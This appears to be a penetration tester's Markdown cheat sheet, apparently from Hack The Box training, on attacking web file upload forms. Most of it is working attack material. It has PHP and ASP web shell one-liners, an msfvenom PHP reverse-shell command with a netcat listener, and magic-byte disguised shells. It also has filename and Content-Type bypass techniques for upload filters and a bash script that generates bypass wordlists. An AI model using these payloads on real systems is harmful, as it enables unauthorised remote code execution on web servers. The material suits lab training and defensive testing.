# file uploads
- unauthenticated arbitrary file upload
  - means any unauthenticated user can upload any file type
- identify language/framework
  - fuff using `https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/web-extensions.txt`
    - doesnt always check for everything so manually check as well 
  - [wabp](https://www.wappalyzer.com/)
- webshell
  - php
    - `echo '<?php system($_REQUEST["cmd"]); ?>' > shell.php`
    - [phpbash](https://github.com/Arrexel/phpbash)
      - `curl "https://raw.githubusercontent.com/Arrexel/phpbash/refs/heads/master/phpbash.php" -o phpbash.php`
    - seclists 
      - `/opt/useful/seclists/Web-Shells`
  - asp
    - `<% eval request('cmd') %>`
- reverse shell
  - https://github.com/pentestmonkey/php-reverse-shell
  - listener `nc -lvnp OUR_PORT`
  - msfvenom
    - `msfvenom -p php/reverse_php LHOST=OUR_IP LPORT=OUR_PORT -f raw > reverse.php`
- client side validation
  - easily bypassable by 
    - directly interacting with the server using burp
      - intercept a successful file upload
        - find the filename and modify to `shell.php`
        - modify the content to be `<?php system($_REQUEST["cmd"]); ?>`
        - check for a response code 200
    - manipulating the front end code to disable validation code
      - remember that it wont persist over page refreshes 
      - inspect element 
      - remove javascript functions or modify javascript validation code in script block
- server side validation
  - extensions
      - blacklisting types
      - php
        ```php
        $fileName = basename($_FILES["uploadFile"]["name"]);
        $extension = pathinfo($fileName, PATHINFO_EXTENSION);
        $blacklist = array('php', 'php7', 'phps');
        if (in_array($extension, $blacklist)) {
            echo "File type not allowed";
            die();
        }
        ```
        - vulns
          - case insensitive `.pHp`
          - doesnt exclude all possible php file types
      - fuzzing to find allowed file types
        - burp
          - intercept
          - send to intruder
          - [clear$] any automatically set positions
          - select `.php` in `filename="HTB.php"` and [add $] as a fuzzing option
          ![alt text](assets/attachments/kb/htb/redteam/assets/techniques/file-uploads/file_uploads_burp_fuzz_extension-1.jpg)
          - load the extensions list via payloads tab and Payload Options 
          - untick [url encoding] option to avoid encoding the (.) before the file extension
          - check for different file lengths and response codes
      - try uploading allowed file containing shell code via repeater
          - `echo '<?php system($_REQUEST["cmd"]); ?>' > shell.phtml`
      - test - `http://SERVER_IP:PORT/profile_images/shell.phtml?cmd=id`
      - wordlists
        - general
          - `https://raw.githubusercontent.com/danielmiessler/SecLists/refs/heads/master/Discovery/Web-Content/web-extensions.txt`  
        - php
          - `https://raw.githubusercontent.com/swisskyrepo/PayloadsAllTheThings/refs/heads/master/Upload%20Insecure%20Files/Extension%20PHP/extensions.lst`
        - .net
          - shell payloads `https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Upload%20Insecure%20Files/Extension%20ASP`
      - whitelisting types
        - generally more secure
        - example
        ```php
        $fileName = basename($_FILES["uploadFile"]["name"]);
        if (!preg_match('^.*\.(jpg|jpeg|png|gif)', $fileName)) {
            echo "Only images are allowed";
            die();
        }
        ```
          -  the regex is weak as it only checks whether the file name contains the extension and not if it actually ends with it
        -  bypass by using double extensions
          -  `shell.jpg.php`
          -  safer code
            -  `if (!preg_match('/^.*\.(jpg|jpeg|png|gif)$/', $fileName)) { ...SNIP... }`
        -  reverse double extension
          -  insecure configurations for the web server
            -  Apache2  `/etc/apache2/mods-enabled/php7.4.conf`
            ```xml
            <FilesMatch ".+\.ph(ar|p|tml)">
              SetHandler application/x-httpd-php
            </FilesMatch>
            ```
            - any file that contains .phar, .php, and .phtml extensions will be allowed PHP code execution, even if it does not end with the PHP extension.
            - `shell.php.jpg` contains .php in its name so will be able to execute php code
        - character injection
          - injecting characters before or after the final extension
            - `shell.php%00.jpg`
          - includes
          ```
          %20
          %0a
          %00
          %0d0a
          /
          .\
          .
          …
          :
          ```
          - `shell.php%00.jpg` works with php5 and causes the file to be ended with `.php` but bypass an image whitelist
          - can also work in .net `shell.aspx:.jpg` by using the `:`
          - bash script to generate permutations of a file name
          ```bash
          for char in '%20' '%0a' '%00' '%0d0a' '/' '.\\' '.' '…' ':'; do
              for ext in '.php' '.phps'; do
                  echo "shell$char$ext.jpg" >> wordlist.txt
                  echo "shell$ext$char.jpg" >> wordlist.txt
                  echo "shell.jpg$char$ext" >> wordlist.txt
                  echo "shell.jpg$ext$char" >> wordlist.txt
              done
          done
          ```
          - need to find a file extension that works then substitute file extensions between `.` and `jpg` 
          ![alt text](assets/attachments/kb/htb/redteam/assets/techniques/file-uploads/image.png)
      - file type
        - checks the `Content-Type Header` header
        - browsers automatically set the Content-Type header when selecting a file through the file selector dialog but it occurs client side so we can bypass it
        - example
          ```php
          $type = $_FILES['uploadFile']['type'];
          if (!in_array($type, array('image/jpg', 'image/jpeg', 'image/png', 'image/gif'))) {
              echo "Only images are allowed";
              die();
          }
          ```
        - burp
        ![alt text](assets/attachments/kb/htb/redteam/assets/techniques/file-uploads/file_uploads_bypass_content_type_request.jpg)
        - use the web-all-content-types.txt file to fuzz - https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/web-all-content-types.txt
        - filter to just get web images `cat web-all-content-types.txt | grep 'image/' > image-content-types.txt`
        - A file upload HTTP request has two Content-Type headers, one for the attached file (at the bottom), and one for the full request (at the top). We usually need to modify the file's Content-Type header, but in some cases the request will only contain the main Content-Type header (e.g. if the uploaded content was sent as POST data), in which case we will need to modify the main Content-Type header.
      - mime type
        - testing the uploaded file's MIME-Type. Multipurpose Internet Mail Extensions (MIME) is an internet standard that determines the type of a file through its general format and bytes structure.
        - done by inspecting the first few bytes of the files contents
          - [magic bytes](https://web.archive.org/web/20240522030920/https://opensource.apple.com/source/file/file-23/file/magic/magic.mime)
          - [file signatures](https://en.wikipedia.org/wiki/List_of_file_signatures)
        - example
        ```php
        $type = mime_content_type($_FILES['uploadFile']['tmp_name']);

        if (!in_array($type, array('image/jpg', 'image/jpeg', 'image/png', 'image/gif'))) {
            echo "Only images are allowed";
            die();
        }
        ```
        - `echo 'GIF8<?php system($_GET["cmd"]); ?' > shell.gif`
        - 94.237.51.163:37537
 https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/web-all-content-types.txt

- profile pic
  - `curl "https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcQIf4R5qPKHPNMyAqV-FjS_OTBB8pfUV29Phg&s" -o profile.png`
- quick shell
  - `echo '<?php system($_REQUEST["cmd"]); ?>' > shell.php`
  - `echo "<?php system($_REQUEST['cmd']); ?>" > shell.php`
  - `echo -e "\xFF\xD8\xFF\xE0<?php system($_REQUEST['cmd']); ?>" > misshell.jpg`
- php list
  - `curl "https://raw.githubusercontent.com/swisskyrepo/PayloadsAllTheThings/refs/heads/master/Upload%20Insecure%20Files/Extension%20PHP/extensions.lst" -o php.lst`
